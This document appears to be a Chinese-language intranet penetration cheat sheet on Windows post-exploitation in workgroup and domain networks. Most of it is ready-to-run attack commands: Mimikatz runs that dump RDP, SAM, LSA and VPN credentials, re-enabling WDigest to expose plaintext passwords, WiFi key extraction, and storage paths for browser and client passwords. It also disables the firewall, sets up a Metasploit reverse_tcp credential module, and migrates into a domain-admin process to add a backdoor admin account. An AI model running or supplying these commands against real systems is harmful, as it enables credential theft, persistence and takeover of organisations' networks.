# 一：工作组信息收集

### 1.1：本机信息收集

    
    
    系统
    systeminfo                                                #查看系统信息
    systeminfo | findstr /B /C:"OS Name" /C:"OS Version"      #查看系统及版本，英文系统
    systeminfo | findstr /B /C:"OS 名称" /C:"OS 版本"         #查看系统及版本，中文系统
    echo %PROCESSOR_ARCHITECTURE%                             #查看系统架构，一般为AMD64
    set                                                       #查看系统环境变量
    wmic qfe get Caption,Description,HotFixID,InstalledOn     #查看系统补丁信息
    wmic bios                                                 #查看bios信息
    nbtstat -A ip                                             #netbios查询
    fsutil fsinfo drives                                      #查看所有的盘符
    gpupdate /force                                           #更新计算机策略
    安装的软件版本信息
    wmic product get name,version                             #查看安装的软件及版本
    powershell "get-wmiobject -class Win32_product | select-Object -property name,version"   #查看安装的软件及版本
    网络
    ipconfig /all                                             #查看ip详细信息
    route print                                               #查看路由
    arp -a                                                    #查看arp缓存表
    net view                                                  #查询机器列表
    type C:\Windows\System32\drivers\etc\hosts                #查看hosts文件
     
    用户账号密码
    net user                                                  #只显示本机的用户，不显示域用户
    net user xie                                              #查看用户xie的具体信息
    wmic useraccount get /ALL                                 #查看本机用户详细信息
    net localgroup                                            #查看组
    net localgroup administrators                             #显示本机的administrators管理员组。除了显示本机中用户，还会显示域用户(前提是该域用户在本机的Administrators组内)
    query user | qwinsta                                      #查询当前在线用户
    whoami /all                                               #查询当前用户权限等
    net accounts                                              #查看本地密码策略
    qwinsta                                                   #查看登录情况
    qwinsta /SERVER:IP                                        #查看远程登录情况
     
    端口
    netstat -ano                                              #查看端口开放情况、
    netstat -ano|findstr 80                                   #查看80端口对应的PID
     
    服务
    net start                                                 #查询当前运行的服务
    wmic service list brief                                   #查看服务name、进程ID、状态等
     
    进程
    tasklist                                                  #查看进程列表
    tasklist  /svc                                            #查看进程，显示进程使用者名称
    tasklist | findstr 80                                     #查看80端口对应的进程
    taskkill /f /t /im xx.exe                                 #杀死xx.exe进程
    taskkill /F -pid 520                                      #杀死pid为520的进程
    wmic process list brief                                   #查看进程
     
    共享
    net use                                                   #查看连接
    net share                                                 #查看共享
    wmic share get name,path,status                           #查看共享
    net session                                               #查看会话
    net view \ip                                              #查询指定IP共享
     
    启动程序信息                 
    wmic startup get command,caption                          #查看启动项信息
     
    计划任务
    schtasks /query /fo LIST /v                               #查看计划任务
     
    开机时间
    net statistics workstation                                #查看机器开机时间
     
    查询IE浏览器的代理信息
    reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" 
     
    查询RDP端口号
    reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP" /V portNumber

>>>防火墙相关配置<<<

    
    
    查看防火墙配置
    netsh firewall show config
     
    关闭防火墙
    Server2003及之前版本：netsh firewall set opmode disable
    Server2003之后版本：netsh advfirewall set allprofiles state off
     
    修改防火墙配置
    Server2003及之前版本，允许指定程序全部连接：netsh firewall add allowedprogram d:\nc.exe "allow nc" enable
    Server2003之后版本,允许指定程序进入：netsh advfirewall firewall add rule name="pass nc" dir=in action=allow program="d\nc.exe"
     
    允许指定程序退出
    netsh advfirewall firewall add rule name="allow nc" dir=out action=allow program="d:\nc.exe"
     
    允许3389端口放行
    netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
     
    自定义防火墙日志的存储位置
    netsh advfirewall set currentprofile logging filename "C:\windows\temp\test.log"

### 1.2：Windows账号密码

#### 1.2.1：Win对用户密码的处理

Windows系统使用两种方法对用户的密码进行哈希处理，它们分别是 **LAN Manager（LM）** 哈希和 **NT LAN
Manager（NTLM**
）哈希。所谓哈希（hash），就是使用一种加密函数对其进行加密。这个加密函数对一个任意长度的字符串数据进行一次数学加密函数运算，然后返回一个固定长度的字符串。

现在已经有了更新的 **NTLMv2** 以及 **Kerberos(域环境)**
验证体系。Windows加密过的密码口令，我们称之为Hash，Windows的系统密码hash默认情况下一般由两部分组成：第一部分是 LM-hash，第二部分是 NTLM-hash。在windows2000以后的系统中，第一部分的 LM-hash 都是空值，因为LM-hash可以很容易的破解，所以windows2000之后这个值默认为空，所以第二部分的NTLM-hash才真正是用户密码的哈希值。

通常可从Windows系统中的SAM文件 和 域控的 **NTDS.dit**
文件中获得所有用户的hash，通过Mimikatz读取lsass.exe进程能获得已登录用户的NTLM hash。

LM和NTLM解密，可以使用线下工具John来进行破解，也可以使用在线解密网站<http://www.cmd5.com/>备注：John工具使用参照第二阶段暴力破解课程。

#### 1.2.2：复制SAM文件方法

SAM文件即账号密码数据库文件。 当我们登录系统的时候，系统会自动地和 C:\Windows\System32\config\SAM
中的SAM文件自动校对，如发现此次密码与SAM文件中的加密数据符合时，你就会顺利登录;如果错误则无法登录。在系统运行期间，SAM文件一直是被占用的，是无法打开和编辑复制的。但是，我们可以通过以下方法进行复制SAM文件，

 **方法一：我们可以进入PE系统进行复制**

  * U盘启动，运行DiskGenius分区工具
  * 找到SAM文件，复制到U盘
  * 在另一台电脑上下载软件NTPWedit并运行，打开SAM文件解锁并修改密码
  * 把SAM文件复制到原来的电脑上，覆盖原文件。

 **方法二：利用Copy-VSS.ps1脚本**

利用Nishang框架内的Copy-VSS.ps1脚本

    
    
    Import-Module .\Copy-VSS.ps1;copy-vss

#### 1.2.3：抓取明文密码或密码Hash

 **参照下级** ///总结：抓取明文密码或密码HASH///

#### 1.2.4：防止主机密码被抓取

微软为了防止用户密码在内存中以明文形式泄露，发布了补丁KB2871997关闭了Wdigest功能。

Windows Server 2012及以上版本默认关闭Wdigest，使攻击者无法从内存中获取明文密码。Windows server
2012以下版本如果安装了KB2871997补丁，攻击者同样无法获取明文密码。

在日常网络维护中，通过查看注册表项Wdigest可以判断其功能状态。如果该项值为1用户下次登录时，攻击者就能使用工具获取明文密码，应该确保该项值为0，使用户明文密码不会出现在内存中。

在命令行中开启或者关闭Wdigest Auth，有以下两种方法:

  1. 使用Red add命令：

    
    
    开启Wdigest Auth，命令如下
    reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
     
    关闭Wdigest Auth，命令如下
    reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f

  2. 使用Powershell

    
    
    开启Wdigest Auth
    Set-ItemProperty -Path HKLM:\SYSTEM\CurrentCzontrolSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1
    关闭Wdigest Auth
    Set-ItemProperty -Path HKLM:\SYSTEM\CurrentCzontrolSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0

注意：需要强调的是，安装了`KB2871997`补丁黑客不仅无法`Dump`出明文密码，而且一般情况下无法使用哈希传递攻击。仅可以使用`SID=500`的用户进行哈希传递攻击，而`SID=500`的用户默认为`administrator`,所以，主机管理员最好也禁用administrator用户

### 1.3：获取RDP凭据

当我们拿到机器的管理员权限后，想要获取其RDP登录历史保存的凭据请看接下里的操作...

#### 1.3.1：Mimikatz抓取

步骤一：执行以下命令查看目标机器是否存在RDP凭据

    
    
    #查看mstsc的连接纪录
    cmdkey /list 
     
    #查找本地的Credentials：
    dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*

步骤二：存在的话直接上传Mimikatz执行以下命令来记录GuidMasterKey值：

    
    
    mimikatz.exe "privilege::debug" "dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\19DC8328D3873E6AB8EF6B081B771D2E"

步骤三：执行以下命令，找到`GuidMasterKey`值对应的MasterKey，上面的GuidMasterKey在这里是GUID

    
    
    mimikatz.exe "privilege::debug" "sekurlsa::dpapi"

步骤四：执行以下命令，使用上面记录的MasterKey破解指定的凭据：19DC8328D3873E6AB8EF6B081B771D2E

    
    
    mimikatz.exe "dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\19DC8328D3873E6AB8EF6B081B771D2E /masterkey:cf8ba397fe285a877997100a3b3fe3259821fe4cb7a47bd9dc8887296a4ff7914a2a3b04a5b8a96d4ce418937604e0a23799f990abb537a599130fce394eb114"

步骤五：如下-->破解出明文密码!

![](https://image.3001.net/images/20220612/1655039263_62a5e51f6a58a31298813.png!small)

#### 1.3.2：NetPass抓取

Network Password Recovery是一款功能齐全的密码恢复软件，通过使用该软件可以用于恢复Windows
中有关于网络方面的各种密码，包括网络连接密码（RAS、VPN、Direct PC 和其他任何类型的网络连接密码）、本地网络和互联网的密码，非常不错。

如果直接登录到远程桌面上去的话。可以直接使用Netpass.exe工具查看！（Network Password Recovery）

![](https://image.3001.net/images/20220612/1655039296_62a5e5403191aba742256.png!small)

#### 1.3.3：Powershell脚本抓取

    
    
    Import-Module .\Invoke-WCMDump.ps1
    Invoke-WCMDump

![](https://image.3001.net/images/20220612/1655039317_62a5e555b89e9086b5579.png!small)

### 1.4：Windows登录日志

    
    
    登录成功日志
    wevtutil qe security /q:"*[EventData[Data[@Name='LogonType']='10'] and System[(EventID=4624)]]" /f:text /rd:true /c:10
    登录失败日志
    wevtutil qe security /q:"*[EventData[Data[@Name='LogonType']='10'] and System[(EventID=4625)]]" /f:text /rd:true /c:10

### 1.5：浏览器账号密码

#### 1.5.1：Google Chrome

  

Chrome浏览器默认的用户数据保存目录如下：

    
    
    用户数据目录：C:\Users\xx\AppData\Local\Google\Chrome\User Data\Default\
    缓存目录：C:\Users\xx\AppData\Local\Google\Chrome\User Data\Default\Cache\
    
    各文件如下：
        书签：C:\Users\xx\AppData\Local\Google\Chrome\User Data\Default\Bookmarks
        Cookie: C:\Users\xx\AppData\Local\Google\Chrome\User Data\Default\Cookies
        浏览历史：C:\Users\xx\AppData\Local\Google\Chrome\User Data\Default\History
        当前的session：C:\Users\xx\AppData\Local\Google\Chrome\User Data\Default\Current Session
        账号密码：C:\Users\xx\AppData\Local\Google\Chrome\User Data\Default\Login Data
                 C:\Users\xx\AppData\Local\Google\Chrome\User Data\Profile 1\Login Data

#### 1.5.2：QQ浏览器

QQ浏览器默认的用户数据保存目录如下：

    
    
    用户数据目录：C:\Users\xx\AppData\Local\Tencent\QQBrowser\User Data\Default
    缓存目录：C:\Users\xx\AppData\Local\Google\Chrome\User Data\Default\Cache\
     
    各文件如下：
        书签：C:\Users\xx\AppData\Local\Tencent\QQBrowser\User Data\Default\Bookmarks
        Cookie: C:\Users\xx\AppData\Local\Tencent\QQBrowser\User Data\Default\Cookies
        浏览历史：C:\Users\xx\AppData\Local\Tencent\QQBrowser\User Data\Default\History
        当前的session：C:\Users\xx\AppData\Local\Tencent\QQBrowser\User Data\Default\Current Session
        账号密码：C:\Users\xx\AppData\Local\Tencent\QQBrowser\User Data\Default\Login Data

#### 1.5.3：360安全浏览器

    
    
    账号密码文件：C:\Users\xx\AppData\Roaming\360se6\User Data\Default\apps\LoginAssis\assis2.db

#### 1.5.4：MSF信息收集模块

    
    
    use post/multi/gather/lastpass_creds
    set payload windows/meterpreter/reverse_tcp
    set lhost 0.0.0.0
    set session 1
    exploit 

#### 1.5.5：浏览器抓取工具

    
    
    https://github.com/QAX-A-Team/BrowserGhost
    https://github.com/moonD4rk/HackBrowserData    //国内首先推荐使用
    https://github.com/djhohnstein/SharpChromium

参考文章：<https://www.secpulse.com/archives/3351.html>

### 1.6：其他软件账号密码

#### 1.6.1：Navicat

数据库类型

|

存放位置  
  
---|---  
  
MySQL

|

HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers\<your connection name>  
  
MariaDB

|

HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers\<your connection
name>  
  
MongoDB

|

HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers\<your connection
name>  
  
Microsoft SQL

|

HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers\<your connection
name>  
  
Oracle

|

HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers\<your connection
name>  
  
PostgreSQL

|

HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers\<your connection
name>  
  
SQLite

|

HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers\<your connection
name>  
  
#### 1.6.2：SecureCRT

操作系统

|

存放位置  
  
---|---  
  
xp/win2003

|

C:\Documents and Settings\USERNAME\Application Data\VanDyke\Config\Sessions  
  
win7/win2008以上

|

C:\Users\USERNAME\AppData\Roaming\VanDyke\Config\Sessions  
  
#### 1.6.3：Xshell

版本号

|

存放路径  
  
---|---  
  
Xshell 5

|

%userprofile%\Documents\NetSarang\Xshell\Sessions  
  
Xshell 6

|

%userprofile%\Documents\NetSarang Computer\6\Xshell\Sessions  
  
#### 1.6.4：Winscp

    
    
    HKVU\Software\Martin Prikry\WinSCP 2\Sessions

#### 1.6.5：VNC

版本类型

|

路径

|

  
  
  
---|---|---  
  
RealVNC

|

HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver

|

Password  
  
TightVNC

|

HKEY_CURRENT_USER\Software\TightVNC\Server Value

|

Password or PasswordViewOnly  
  
TigerVNC

|

HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4

|

Password  
  
UltraVNC

|

C:\Program Files\UltraVNC\ultravnc.ini

|

passwd or passwd2  
  
### 1.7：VPN账号密码

mimikatz或图形化命令工具：Dialupass.exe

    
    
    mimikatz.exe privilege::debug token::elevate lsadump::sam lsadump::secrets exit

### 1.8：WIFI账号密码

    
    
    #查看帮助
    netsh wlan help
    #列出无线接口
    netsh wlan show interface
    #开启无线接口
    netsh interface set interface "Interface Name" enabled
    #显示连接过的WIFI的配置文件
    netsh wlan show profiles
    #连接指定wifi
    netsh wlan connect name=xxxx
    #断开连接
    netsh wlan disconnect
    #查看连接过的WIFI的配置文件(包含账号密码)，需要管理员权限执行
    netsh wlan export profile interface=WLAN key=clear folder=C:\
    #然后使用type命令查看配置文件
    type C:\xxx.xml
    #批量显示wifi账号密码
    for /f  "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles')  do  @echo %j | findstr -i -v echo |  netsh wlan show profiles %j key=clear
    其它常用的命令：
        导出配置文件：netsh wlan export profile key=clear
        删除配置文件：netsh wlan delete profile name=""
        添加配置文件：netsh wlan add profile filename=""

### 1.9：WEB服务配置路径

1.9.1：IIS

    
    
    IIS6：
    cscript.exe C:\Inetpub\AdminScripts\adsutil.vbs ENUM W3SVC/1/root
    IIS7、IIS8：
    列出网站列表：appcmd.exe %systemroot%/system32/inetsrv/appcmd.exe list site
    列出网站物理路径：appcmd.exe %systemroot%\system32\inetsrv\appcmd.exe list vdir
    或者使用mimikatz读取IIS7配置文件：
    mimikatz.exe privilege::debug log "iis::apphost /in:"%systemroot%\system32\inetsrv\config\applicationHost.config" /live" exit

1.9.2：Tomcat

    
    
    /conf/tomcat-users.xml
    /conf/server.xml
    /conf/web.xml

1.9.3：Apache

    
    
    /etc/httpd/conf/httpd.conf

1.9.4：Nginx

    
    
    /etc/nginx/nginx.conf

1.9.5：Wdcp

    
    
    /www/wdlinux/wdcp/conf/mrpw.conf

# 二：域环境信息收集

当我们通过代理进入内网，并且通过信息收集已经得知当前处于域环境下...

域环境渗透：

  * 目的

获得域管理员账号，登录域控进而控制域内所有主机，获得域内网重要信息

  * 思路

先获取域内一台主机权限，查看当前获取权限的用户是本地用户还是域用户。

* 本地用户：如果是本地用户，则按非域环境渗透思路，提升为Administrator权限后，则可以执行域命令。如果提权失败，则想办法获取下一个主机权限，在查看是否是域用户或administrator权限，如此反复，最终需要能执行域命令，进行域渗透

* 域用户：直接进行各种域命令的查询，域内的横向渗透...

### 2.1：域信息收集

    
    
    nltest  /domain_trusts                      #查看域信任信息或查询有几个域
    nslookup -qt=ns warsec.com                  #查询各个域的域控
    net time /domain                            #查看时间服务器
    net config workstation                      #查询当前登录域及登录用户信息
    net user /domain                            #查询域内用户
    wmic useraccount get /all                   #查询域内用户的详细信息
    net user warsec /domain                        #查看指定域用户xie的详细信息
    net view /domain                            #查看有几个域
    net view /domain:xxx                        #查看域内的主机
    net group /domain                           #查看域里面的组
    net group "domain users"  /domain           #查看域用户
    net group "domain controllers" /domain      #查看域控制器
    net group "domain computers" /domain        #查看域内所有的主机
    net group "domain admins"  /domain          #查看域管理员,该组内的成员对域控拥有完全控制权
    net group "enterprise admins" /domain       #查看企业管理组,该组内的成员对域控拥有完全控制权
    net group "domain guest"  /domain           #查看域访客组,权限较低
    nltest  /domain_trusts                      #查看域信任信息
    net accounts /domain                        #查询域密码策略
    whoami /user                                #查看用户SID和域SID，如用户的SID是：S-1-5-21-2189311154-2766837956-1982445477-520 则域SID则是去掉最后的520：S-1-5-21-2189311154-2766837956-1982445477
    以下命令只能在域控上查询
    dsquery user                                #查询目录中的用户
    dsquery computer                            #查询目录中的主机
    dsquery group                               #查询目录中的组.
    dsquery ou                                  #查询目录中的组织单元.
    dsquery site                                #查询目录中的站点
    dsquery server                              #查询域控
    dsquery contact                             #查询目录中的联系人
    dsquery subnet                              #查询目录中的子网
    dsquery quota                               #查询目录中的配额规定.
    dsquery partition                           #查询目录中的分区.
    dsquery *                                   #用通用的LDAP查询来查找目录中的任何对 
    dsquery server –domain xie.com | dsget server–dnsname –site     #搜索域内域控制器的DNS主机名和站点名
    dsquery computer domainroot –name -xp –limit 10      #搜索域内以-xp结尾的机器10台
    dsquery user domainroot –name admin -limit           #搜索域内以admin开头的用户10个
    

### 2.2：查询域控主机名

    
    
    方法一：net group "domain controllers" /domain       #这里查询结果后面会多一个 $ 
    方法二：nltest /DCLIST:xie.com
    方法三：net time /domain 
    方法四：nslookup -type=srv _ldap._tcp
    方法五：查看DNS服务器的地址，一般DNS服务器的IP就是域控的地址
    方法六：netdom query pdc                             #该命令只能在域控上执行
    方法七：dsquery server                               #该命令只能在域控上执行

### 2.3：定位域管理员和域用户

定位域管理员的常规渠道，一是日志，而是回话。

日志是指本地机器的管理员日志，可以使用脚本或者Wevtutil工具查看。

会话是指域内每台机器的登录回话，详情查看子目录的【定位域管理员】

### 2.4：迁移进域管进程

在内网渗透中，往往得不到域管理员的明文账号密码或密码Hash,所以我们要想得到与管理员的权限，另一个思路就是通过找到机器上域管理员开启的进程，迁移到该进程模拟域管理员，进而或得域管理员权限。而找到域管理员开启的进程并不是这么简单的，需要不停的内网横向移动获取新的服务器的权限，直到找到一台机器上有域管理员开启的进程位置.方法参照子目录【查找域管理员进程】

    
    
    #迁移到管理员进程
    migrate 2912
     
    #Shell下创建用户并添加到域管理员组中
    net user test2 root@123 /add /domain
    net group "domain admins" test2 /add /domain
     
    #meterpreter下创建用户并添加到域管理员组中,-h参数跟的是域控ip
    add_user test3  root@123 -h 192.168.10.131
    add_group_user "domain admins" test3 -h 192.168.10.131

### 2.5：模拟域管理员

当我们获取到域管理员账号和明文后，我们可以有以下方式模拟域管理员...

连接方式

|

方式特点  
  
---|---  
  
RDP远连

|

普通账号即可，动静大，容易被发现，不到万不得已不要远程连接  
  
IPC$远连

|

需管理员组内账号，对方主机需开启IPC$共享  
  
Psexec远连

|

需管理员组内账号，对方主机需开启admin$共享  
  
WMIC远连

|

需管理员组内账号，对方主机需开启admin$共享  
  
SMBexec远连

|

需管理员组内账号，对方主机需开启C$共享  
  
WinRM远连

|

需管理员组内账号，对方主机需要开启WinRM服务  
  
DCOM远连

|

需管理员组内账号....  
  
135端口

|

如果目标主机只开启了135端口，则可以使用135端口进行免杀横向移动  
  
PTH攻击

|

Pass The Hash,哈希传递攻击...  
  
  

